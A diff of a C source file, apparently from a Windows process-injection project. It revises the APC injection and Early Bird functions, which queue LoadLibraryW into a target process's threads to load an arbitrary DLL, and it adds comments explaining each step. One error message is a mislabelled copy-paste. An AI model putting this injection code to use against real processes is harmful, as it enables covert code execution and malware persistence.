@@ -1,13 +1,12 @@
 #include "global.h"
 
 /*
-	- APC Injection (also known as Early Bird technique).
-	  - **The implementation includes creating a new process instead of injecting a existing one. this is because of QueueUserAPC behaviour**
+	- APC Injection
 	  - Searching for `LoadLibraryW` address. We assuming `kernel32` libraries are loaded in same addresses for all processes.
-	  - Creating new process in suspended state. The executable is passed by param to the injection function.
-	  - Invoking `VirtualAllocEx` to allocate injected DLL name string.
+	  - Invoking `VirtualAllocEx` to allocate injected DLL name string. 
 	  - Invoking `WriteProcessMemory` to write that string.
-	  - Invoking `QueueUserAPC` with `LoadLibraryW` procedure and DLL name as a parameter. This function queues asynchronous procedure to the therad when he returns from **alertable** state. That state includes returning from the next functions:
+	  - Enumerating all threads of the specified process using `CreateToolhelp32Snapshot`.
+	  - For each such thread we are invoking `QueueUserAPC` with `LoadLibraryW` procedure and DLL name as a parameter. This function queues asynchronous procedure to the therad when he returns from **alertable** state. That state includes returning from the next functions:
 		- `kernel32!SleepEx`
 		- `kernel32!SignalObjectAndWait`
 		- `kernel32!WaitForSingleObject`
@@ -15,10 +14,10 @@
 		- `kernel32!WaitForMultipleObjects`
 		- `kernel32!WaitForMultipleObjectsEx`
 		- `user32!MsgWaitForMultipleObjectsEx`
-	  - Invoking `ResumeThread`. Because thread was in suspended state, starting it causes the operating system to invoke his waiting APC, means the injected code.
+	  - Most of the time one of the threads will be returning from that state, and reload the library. I had 100% success with that method.
 */
 BOOL makeAPCInjection(PWSTR hTargetProcess, PWSTR pwszDllName) {
-	SIZE_T cbAllocationSize, cbBytesWritten;
+	SIZE_T cbAllocationSize;
 	PWSTR pwszRemoteDllNameAddr; 
 	HANDLE hThreadSnap;
 	THREADENTRY32 te;
@@ -71,8 +70,18 @@ BOOL makeAPCInjection(PWSTR hTargetProcess, PWSTR pwszDllName) {
 	return TRUE;
 }
 
+/*
+	- Early Bird Technique
+	  - **The only difference here from APC Injection is the creation of a new process instead of injecting a existing one.**
+	  - Searching for `LoadLibraryW` address. We assuming `kernel32` libraries are loaded in same addresses for all processes.
+	  - Creating new process in suspended state. The executable is passed by param to the injection function.
+	  - Invoking `VirtualAllocEx` to allocate injected DLL name string.
+	  - Invoking `WriteProcessMemory` to write that string.
+	  - Invoking `QueueUserAPC` with `LoadLibraryW` procedure and DLL name as a parameter.
+	  - Invoking `ResumeThread`. Because thread was in suspended state, starting it causes the operating system to invoke the APC, means the injected code.
+*/
 BOOL makeEarlyBirdInjection(PWSTR pwszExePath, PWSTR pwszDllName) {
-	SIZE_T cbAllocationSize, cbBytesWritten;
+	SIZE_T cbAllocationSize;
 	PWSTR pwszRemoteDllNameAddr;
 	HANDLE hThread = INVALID_HANDLE_VALUE;
 	HANDLE hProcess = INVALID_HANDLE_VALUE;
@@ -89,7 +98,7 @@ BOOL makeEarlyBirdInjection(PWSTR pwszExePath, PWSTR pwszDllName) {
 	ZeroMemory(&pi, sizeof(pi));
 
 	if (!CreateProcess(pwszExePath, pwszExePath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-		DBG_PRINT("CreateProcess failed. Error code %d\n", GetLastError());
+		printf("CreateProcess failed. Error code %d\n", GetLastError());
 		return FALSE;
 	}
 
@@ -103,12 +112,12 @@ BOOL makeEarlyBirdInjection(PWSTR pwszExePath, PWSTR pwszDllName) {
 	}
 
 	if (!QueueUserAPC((PAPCFUNC)pLoadLibraryW, hThread, pwszRemoteDllNameAddr)) {
-		DBG_PRINT("QueueUserAPC failed. Error code %d\n", GetLastError());
+		printf("QueueUserAPC failed. Error code %d\n", GetLastError());
 		return FALSE;
 	}
 
 	if (!ResumeThread(hThread)) {
-		DBG_PRINT("QueueUserAPC failed. Error code %d\n", GetLastError());
+		printf("QueueUserAPC failed. Error code %d\n", GetLastError());
 		return FALSE;
 	}
 
